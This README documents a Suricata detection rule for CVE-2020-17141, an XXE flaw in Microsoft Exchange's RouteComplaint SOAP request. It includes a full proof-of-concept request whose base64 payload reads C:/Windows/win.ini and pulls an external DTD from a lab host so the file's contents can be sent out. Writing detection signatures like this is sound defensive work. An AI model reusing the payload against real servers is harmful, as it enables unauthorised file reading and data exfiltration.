CVE/CVE-2020-17141/README.md

## Overview
CVE-2020-17141 is an XXE Injection vulnerability that allows attackers to read any file on the system running vulnerable versions of Microsoft Exchange Server.

It targets the RouteComplaint SOAP request with the base64-encoded payload.

In this Suricata rule, I try to base64-decode the payload, then search the strings "<!DOCTYPE" and "SYSTEM", which are the keywords of an XXE Injection attack.

## Proof of Concept
```
POST /ews/Exchange.asmx HTTP/1.1
Host: example.com
Content-type: text/xml; charset=utf-8
Content-Length: 867

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
<soap:Header>
<t:RequestServerVersion Version="Exchange2010_SP2"></t:RequestServerVersion>
</soap:Header>
<soap:Body>
<m:RouteComplaint MessageDisposition="SaveOnly">
<m:Data>PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPCFET0NUWVBFIHJvb3QgWwogPCFFTlRJVFkgJSBzdGFydCAiPCFbQ0RBVEFbIj4KIDwhRU5USVRZICUgc3R1ZmYgU1lTVEVNICJmaWxlOi8vL0M6L1dpbmRvd3Mvd2luLmluaSI+CjwhRU5USVRZICUgZW5kICJdXT4iPgo8IUVOVElUWSAlIGR0ZCBTWVNURU0gImh0dHA6Ly8xMC4wLjIuMTU6OTA5MC9wb2MuZHRkIj4KJWR0ZDsKXT4=</m:Data>
</m:RouteComplaint>
</soap:Body>
</soap:Envelope>
```

## References
* https://srcincite.io/advisories/src-2020-0031/
* https://srcincite.io/pocs/cve-2020-17141.py.txt
* https://portal.msrc.microsoft.com/security-guidance/advisory/CVE-2020-17141
